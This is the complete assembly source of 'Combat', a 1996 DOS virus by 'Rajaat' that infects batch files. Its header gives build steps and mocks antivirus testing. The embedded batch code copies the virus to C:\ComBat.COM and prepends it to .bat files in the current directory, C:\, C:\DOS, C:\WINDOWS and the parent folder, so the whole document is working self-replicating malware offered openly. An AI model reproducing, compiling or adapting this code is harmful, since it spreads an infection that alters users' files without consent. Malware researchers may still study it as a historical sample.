;=====( Combat virus by Rajaat )===============================================
;
; Non-resident BAT infector, doesn't use external programs by third party.
;
;==============================================================================
;
; Virus name    : Combat
; Author        : Rajaat
; Origin        : United Kingdom, July 1996
; Compiling     : Using TASM
;
;                 TASM /M COMBAT
;                 TLINK /T COMBAT
;                 REN COMBAT.COM COMBAT.BAT
; Targets       : BAT files
; Size          : Doesn't matter
; Resident      : No
; Polymorphic   : No
; Encrypted     : No
; Stealth       : No
; Tunneling     : No
; Retrovirus    : No
; Antiheuristics: No
; Peculiarities : It infects BAT files parasitically
; Drawbacks     : It's a goddamn BAT infector, what do you think?!?
; Behaviour     : No really, find out yourself! I was bored and made this,
;                 do you really think I'd spend time explaining what it DOES?
;                 It's unknown what this virus might do besides replicate :)
;==============================================================================
;
; Results with antivirus software
;
;       TBFILE                    - Not tested
;       TBSCAN                    - Not tested
;       TBMEM                     - Not tested
;       TBCLEAN                   - Not tested
;       SVS                       - Not tested
;       SSC                       - Not tested
;       F-PROT                    - Not tested
;       F-PROT /ANALYSE           - Not tested
;       F-PROT /ANALYSE /PARANOID - Not tested
;       AVP                       - Not tested
;       VSAFE                     - Not tested
;       NEMESIS                   - Not tested
;
;==============================================================================

.model tiny
.code
.radix 16

signature       equ 5240

                org 100

main:
                db '@REM ',0ff
                jmp com_entry
                db ' * ComBat *'
                db 0dh,0ah
                db '@echo off',0dh,0ah
                db 'goto ComBat',0dh,0ah

com_entry:      mov si,80
                cmp byte ptr ds:[si],0
                je no_check
                cld
find_argument:  inc si
                lodsb
                dec si
                cmp al,20
                je find_argument
                mov dx,si
find_end:       lodsb
                cmp al,0dh
                jne find_end
                mov byte ptr ds:[si-1],0
                push dx
                mov ax,3d02
                int 21
                jc no_check
                xchg ax,bx
                lea dx,virus_end
                mov ah,3f
                mov cx,3
                int 21
                mov ah,3e
                int 21
                pop dx
                cmp word ptr virus_end,signature
                je no_check
                mov ax,4301
                xor cx,cx
                int 21
                mov ah,3c
                xor cx,cx
                lea dx,temp_file
                int 21
                jc no_check
                xchg ax,bx
                mov ah,40
                lea dx,main
                mov cx,file_length
                int 21
                mov ah,3e
                int 21
                mov ax,4c00
                int 21

                db 0,'Rajaat / Genesis',0

no_check:       mov ax,4c01
                int 21

temp_file       db 'ComBat.TMP',0

batch_2         db 0dh,0ah
                db ':ComBat',0dh,0ah
                db 'if #%_tmp%#==## goto no_call',0dh,0ah
                db 'C:\ComBat.COM %1',0dh,0ah
                db 'if errorlevel 1 goto done_ComBat',0dh,0ah
                db 'type %1 >> ComBat.TMP',0dh,0ah
                db 'echo. >> ComBat.TMP',0dh,0ah
                db 'echo :done_ComBat >> ComBat.TMP',0dh,0ah
                db 'copy ComBat.TMP %1 > nul',0dh,0ah
                db 'del ComBat.TMP > nul',0dh,0ah
                db 'goto done_ComBat',0dh,0ah
                db ':no_call',0dh,0ah
                db 'set _tmp=%0',0dh,0ah
                db 'if #%_tmp%#==## set _tmp=AUTOEXEC.BAT',0dh,0ah
                db 'if not exist %_tmp% set _tmp=%0.BAT',0dh,0ah
                db 'if not exist %_tmp% goto path_error',0dh,0ah
                db 'copy %_tmp% C:\ComBat.COM > nul',0dh,0ah
                db 'for %%f in (*.bat c:\*.bat c:\dos\*.bat c:\windows\*.bat ..\*.bat) do call %_tmp% %%f',0dh,0ah
                db 'del C:\ComBat.COM > nul',0dh,0ah
                db ':path_error',0dh,0ah
                db 'set _tmp=',0dh,0ah
file_length     equ $-main
virus_end       equ $
                db ':done_ComBat',0dh,0ah

end main
